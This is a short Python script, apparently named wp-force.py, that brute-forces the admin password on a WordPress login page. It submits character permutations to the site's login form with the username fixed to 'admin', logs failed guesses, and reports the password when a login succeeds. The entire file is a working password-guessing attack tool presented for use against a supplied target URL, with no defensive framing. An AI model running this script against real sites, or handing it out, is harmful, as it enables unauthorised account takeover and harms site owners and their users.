import re 
import sys
import string
import itertools
from mechanize import Browser
from BeautifulSoup import BeautifulSoup

def WpForce(target_url, password_max_length = 8):
    max_length = password_max_length
    temp_count = 15
    report_guess = 15
    total_guesses = 0
    mychars = string.ascii_lowercase 
    mychars += string.ascii_uppercase
    mychars += string.digits
    mychars += string.punctuation
    
    print("\n\n# Attacking Target: " + target_url + "\n\n##### Attack Log ##### \n")

    for length in range(0, max_length):
            for subset in itertools.permutations(mychars, length):
                    br = Browser()
                    br.open(target_url)
                    br.select_form(name="loginform")
                    guess = ''.join(subset)
                    br["log"] = "admin"
                    br["pwd"] = guess
                    
                    response = br.submit()
                    parsed_html = BeautifulSoup(response)
                    check_response = parsed_html.body.find('div', attrs={'id':'login_error'}).text
                    total_guesses = total_guesses + 1

                    if check_response[0:5] == "ERROR":
                        if temp_count > report_guess:
                            print("# Login Failed on guess: " + str(guess) + " | Total Guesses: " + str(total_guesses))
                            temp_count = 0
                        else:
                            temp_count = temp_count + 1
                    else:
                        print("Login Successful")
                        return guess
    return False

if __name__ == "__main__":
    try:
        password = WpForce(sys.argv[1])
        if password:
            print("\n\nThe password is: " + password)
        else:
            print("\n\nPassword was not found.")
    except Exception:
        print("Usage: wp-force.py <target url> \nExample: wp-force.py http://example.com/wp-login.php")

    
